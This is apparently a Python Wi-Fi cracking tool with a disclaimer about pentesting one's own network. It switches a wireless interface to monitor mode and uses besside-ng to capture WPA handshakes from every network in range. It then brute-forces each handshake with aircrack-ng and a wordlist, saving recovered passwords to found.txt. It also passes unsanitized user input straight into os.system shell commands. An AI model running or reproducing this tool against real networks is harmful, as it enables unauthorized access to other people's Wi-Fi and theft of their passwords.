import os
from termcolor import colored
try:
    logo = '''

           (                                       
         ( )\ )       )             
     (   )(()/(    ( /(   (  ( 
     )\ ((_/(_))(  )\()) ))\ )( 
    ((_) _(_))  )\((_)\ /((_(()\ 
    | __| | _ \((_| |(_(_))  ((_) 
    | _|| |  _/ _ | / // -_)| '_|
    |___|_|_| \___|_\_\\___||_|  
                                                   
    '''
    print(colored(logo,"red"))
    print(colored("Warning :I made this tool to help you Pentest Your NetWork,I Am Not Responsible of any Illegal Use", 'red'))
    print("\n")
    print(colored(
        "My Channel : https://www.youtube.com/channel/UCkmU73jmY7TFUEYF0OGMQFQ", 'blue'))
    print(colored("My Github : https://github.com/thepokar", 'blue'))
    print("\n")
    wlan = input(colored("Enter Your Interface Default [wlan0] =====> ", "blue"))
    tim = input(colored("Set Minutes Of The Scan Default [5] =====> ", "blue"))
    lis = input(colored("Enter Your Wordlist =====> ", "blue"))

    if wlan == "":
        wlan = "wlan0"
    else:
        wlan = str(wlan)
        cc = os.popen("ifconfig")
        xx = cc.read()
        if wlan in xx:
            pass
        else:
            print(colored("There Is Error In Interface", "red"))
            exit()
    if tim == "":
        tim = "5m"
    else:
        tim = str(tim)+"m"
    os.system("ifconfig "+str(wlan)+" down")
    os.system("iwconfig "+str(wlan)+" mode monitor")
    os.system("ifconfig "+str(wlan)+" up")

    print(colored("----------------------------------------------", "green"))
    print(colored("| All Found Passwords Will Save In found.txt |", "green"))
    print(colored("______________________________________________", "green"))


    os.system("cd handshake;timeout "+str(tim)+" besside-ng  " +str(wlan) + " | grep '@#!@#!#!@!@@!@#'")
    xx = os.popen("cd handshake;echo 1 | aircrack-ng wpa.cap")
    zz = xx.read()
    ii = zz.find("1 ")
    ss = zz.find("Index")
    ff = len(zz[ii:ss].split("\n"))
    sav = open("saved.txt", "r")
    sev = sav.readlines()
    for aa in range(0, ff-2):
        nn = zz[ii:ss].split("\n")[aa]
        cc = nn.find("  ", 10)
        rr = nn.find("  ", cc+5)
        if str(nn[cc:rr].strip()) + str(lis) not in str(sev):
            print(colored("Started Brute Force On ====> " + str(nn[cc:rr].strip()), "red"))
            comm = "echo " + str(aa) + "| aircrack-ng handshake/wpa.cap -w  " + str(lis) + " | grep 'KEY FOUND!' |cut -d ' ' -f 4 | tail +2 |tee -a found.txt|wait"
            os.system(comm)
            wr = open("saved.txt", "a")
            wr.write(str(nn[cc:rr].strip()) + str(lis))
            wr.write("\n")
            wr.close()
        else:
            pass
except(KeyboardInterrupt):
    print(colored("\n[!] Good Bye !", "red"))
    exit()
